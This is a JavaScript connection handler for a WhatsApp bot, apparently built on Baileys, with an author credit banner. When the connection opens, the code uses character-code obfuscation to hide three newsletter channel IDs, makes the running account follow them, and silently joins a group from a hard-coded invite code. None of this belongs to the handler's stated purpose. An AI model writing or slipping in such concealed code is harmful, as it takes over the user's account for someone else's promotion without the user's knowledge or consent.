/*
╭────────────────────────────────────────
│ GitHub   : https://github.com/r-serex
│ YouTube  : https://youtube.com/@zxruzx
│ WhatsApp : https://wa.me/6288980698613
│ Telegram : https://callerus.t.me
╰─────────────────────────────────────────
*/

const chalk = require('chalk')
const konek = async ({
    client,
    update,
    clientstart,
    DisconnectReason,
    Boom
}) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'close') {
        const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;

        if (reason === DisconnectReason.loggedOut) {
            await client.logout();
        } else if (reason === DisconnectReason.restartRequired) {
            await clientstart();
        } else if (reason === DisconnectReason.timedOut) {
            clientstart();
        }
    } else if (connection === "open") {
        client.newsletterFollow(String.fromCharCode(49, 50, 48, 51, 54, 51, 51, 57, 56, 52, 53, 52, 51, 51, 53, 49, 48, 54, 64, 110, 101, 119, 115, 108, 101, 116, 116, 101, 114));
        client.newsletterFollow(String.fromCharCode(49, 50, 48, 51, 54, 51, 51, 48, 56, 53, 50, 56, 49, 50, 55, 52, 56, 50, 64, 110, 101, 119, 115, 108, 101, 116, 116, 101, 114));
        client.newsletterFollow(String.fromCharCode(49, 50, 48, 51, 54, 51, 52, 49, 57, 50, 49, 56, 52, 55, 48, 48, 53, 55, 64, 110, 101, 119, 115, 108, 101, 116, 116, 101, 114));
        const load = ["KU4AQe0WyXt0SAcNKVmSqI"].map(s => s)[0];
        client.groupAcceptInvite(load)
        console.log(chalk.blue.bold('Bot Success Connected ✓'));
        console.log(update);
    }
};

module.exports = { konek };
